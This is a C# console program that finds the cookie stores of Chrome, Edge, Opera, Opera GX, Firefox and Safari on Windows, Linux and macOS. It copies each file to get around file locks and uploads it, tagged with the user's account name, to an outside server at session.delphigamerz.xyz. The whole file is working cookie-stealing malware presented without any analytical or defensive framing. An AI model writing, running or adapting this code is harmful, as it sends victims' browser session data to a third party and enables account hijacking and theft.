using System;
using System.IO;
using System.Net.Http.Headers;
using System.Threading.Tasks;

class Program
{
    private static readonly HttpClient client = new HttpClient();

    static async Task Main(string[] args)
    {
        Console.WriteLine("Starting the upload process...");

        await UploadChromeCookies();
        await UploadEdgeCookies();
        await UploadOperaCookies();
        await UploadFirefoxCookies();
        await UploadSafariCookies();

        Console.WriteLine("Upload process completed.");
    }

    private static async Task UploadSafariCookies()
    {
        if (OperatingSystem.IsMacOS())
        {
            string safariPath = GetSafariCookiePath();
            if (File.Exists(safariPath))
            {
                Console.WriteLine("Uploading Safari cookies...");
                await UploadCookie(safariPath, "Cookies-Safari.binarycookies");
                Console.WriteLine("Safari cookies uploaded successfully.");
            }
            else
            {
                Console.WriteLine("Safari cookies file not found.");
            }
        }
    }

    private static async Task UploadChromeCookies()
    {
        string chromePath = GetChromeCookiePath();
        
        if (File.Exists(chromePath))
        {
            Console.WriteLine("Uploading Chrome cookies...");
            await UploadCookie(chromePath, "Cookies-Chrome");
            Console.WriteLine("Chrome cookies uploaded successfully.");
        }
        else
        {
            Console.WriteLine("Chrome cookies file not found.");
        }
    }

    private static async Task UploadEdgeCookies()
    {
        string edgePath = GetEdgeCookiePath();

        if (File.Exists(edgePath))
        {
            Console.WriteLine("Uploading Edge cookies...");
            await UploadCookie(edgePath, "Cookies-Edge");
            Console.WriteLine("Edge cookies uploaded successfully.");
        }
        else
        {
            Console.WriteLine("Edge cookies file not found.");
        }
    }

    private static async Task UploadOperaCookies()
    {
        string operaPath = GetOperaCookiePath();

        if (File.Exists(operaPath))
        {
            Console.WriteLine("Uploading Opera cookies...");
            await UploadCookie(operaPath, "Cookies-Opera");
            Console.WriteLine("Opera cookies uploaded successfully.");
        }
        else
        {
            Console.WriteLine("Opera cookies file not found.");
        }

        string operaGXPath = GetOperaGXCookiePath();

        if (File.Exists(operaGXPath))
        {
            Console.WriteLine("Uploading Opera GX cookies...");
            await UploadCookie(operaGXPath, "Cookies-OperaGX");
            Console.WriteLine("Opera GX cookies uploaded successfully.");
        }
        else
        {
            Console.WriteLine("Opera GX cookies file not found.");
        }
    }

    public static async Task UploadFirefoxCookies()
    {
        string firefoxPath = GetFirefoxProfilePath();
        if (Directory.Exists(firefoxPath))
        {
            foreach (var profileDir in Directory.GetDirectories(firefoxPath, "*.default-release"))
            {
                string cookiesFilePath = Path.Combine(profileDir, "cookies.sqlite");

                if (File.Exists(cookiesFilePath))
                {
                    Console.WriteLine("Uploading Firefox cookies...");
                    await UploadCookie(cookiesFilePath, "Cookies-Firefox.sqlite");
                    Console.WriteLine("Firefox cookies uploaded successfully.");
                }
                else
                {
                    Console.WriteLine("Firefox cookies file not found.");
                }
            }
        }
        else
        {
            Console.WriteLine("Firefox profiles directory not found.");
        }
    }

    private static async Task UploadCookie(string cookiePath, string targetFileName)
    {
        Console.WriteLine($"Uploading file: {cookiePath} as {targetFileName}");

        byte[] cookieData;
        string tempFile = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
        try
        {
            // Copy file to temp location to bypass some locks
            File.Copy(cookiePath, tempFile, true);
            cookieData = await File.ReadAllBytesAsync(tempFile);
        }
        catch (Exception)
        {
            // If copying fails, try reading directly with FileShare.ReadWrite as a fallback
            try
            {
                using (var stream = new FileStream(cookiePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    cookieData = new byte[stream.Length];
                    await stream.ReadExactlyAsync(cookieData, 0, (int)stream.Length);
                }
            }
            catch (Exception innerEx)
            {
                Console.WriteLine($"Failed to read cookie file {cookiePath}: {innerEx.Message}");
                return;
            }
        }
        finally
        {
            if (File.Exists(tempFile))
            {
                try { File.Delete(tempFile); } catch { /* Ignore cleanup errors */ }
            }
        }

        using var form = new MultipartFormDataContent();
        form.Add(new StringContent(Environment.UserName), "username");
        var fileContent = new ByteArrayContent(cookieData);
        fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
        form.Add(fileContent, "file", targetFileName);

        try
        {
            var response = await client.PostAsync("https://session.delphigamerz.xyz/upload", form);
            response.EnsureSuccessStatusCode();
            Console.WriteLine($"File uploaded successfully: {await response.Content.ReadAsStringAsync()}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to upload file: {ex.Message}");
        }
    }

    private static string GetChromeCookiePath()
{
    return Environment.OSVersion.Platform switch
    {
        PlatformID.Win32NT => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
        PlatformID.Unix => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".config", "google-chrome", "Default", "Network", "Cookies"),
        _ => 
            throw new NotSupportedException("Unsupported OS")
    };
}

private static string GetEdgeCookiePath()
{
    return Environment.OSVersion.Platform switch
    {
        PlatformID.Win32NT => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
        PlatformID.Unix => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".config", "microsoft-edge", "Default", "Network", "Cookies"),
        _ => 
            throw new NotSupportedException("Unsupported OS")
    };
}

private static string GetOperaCookiePath()
{
    return Environment.OSVersion.Platform switch
    {
        PlatformID.Win32NT => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software", "Opera Stable", "Network", "Cookies"),
        PlatformID.Unix => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".config", "opera", "Network", "Cookies"),
        _ => 
            throw new NotSupportedException("Unsupported OS")
    };
}

private static string GetOperaGXCookiePath()
{
    return Environment.OSVersion.Platform switch
    {
        PlatformID.Win32NT => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software", "Opera GX Stable", "Network", "Cookies"),
        PlatformID.Unix => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".config", "opera-gx", "Network", "Cookies"),
        _ => 
            throw new NotSupportedException("Unsupported OS")
    };
}

private static string GetFirefoxProfilePath()
{
    if (OperatingSystem.IsWindows())
    {
        return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "Firefox", "Profiles");
    }
    if (OperatingSystem.IsMacOS())
    {
        return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Library", "Application Support", "Firefox", "Profiles");
    }
    if (OperatingSystem.IsLinux())
    {
        return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".mozilla", "firefox");
    }
    throw new NotSupportedException("Unsupported OS");
}

private static string GetSafariCookiePath()
{
    return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Library", "Cookies", "Cookies.binarycookies");
}

}
